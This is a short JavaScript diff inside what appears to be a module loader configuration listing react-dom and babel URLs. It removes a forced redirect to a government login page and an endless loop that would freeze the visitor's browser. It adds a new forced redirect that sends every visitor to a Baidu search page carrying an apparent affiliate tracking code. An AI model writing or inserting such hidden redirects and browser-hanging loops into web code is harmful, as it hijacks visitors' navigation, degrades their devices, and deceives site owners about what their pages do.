@@ -7,9 +7,7 @@
     "react-dom": "https://unpkg.com/react-dom@16/umd/react-dom.development.js",
     babel: "https://unpkg.com/babel-standalone@6.15.0/babel.min.js",
   }; 
-  window.location.href = 'https://mczxgl.mczx.gov.cn/#/login'
-  while (true) {
-    window.sum += 100000000
-  }
+  window.location.href = 'https://www.baidu.com/?tn=02049043_52_pg&ch=3'
+  
    
 })(window);
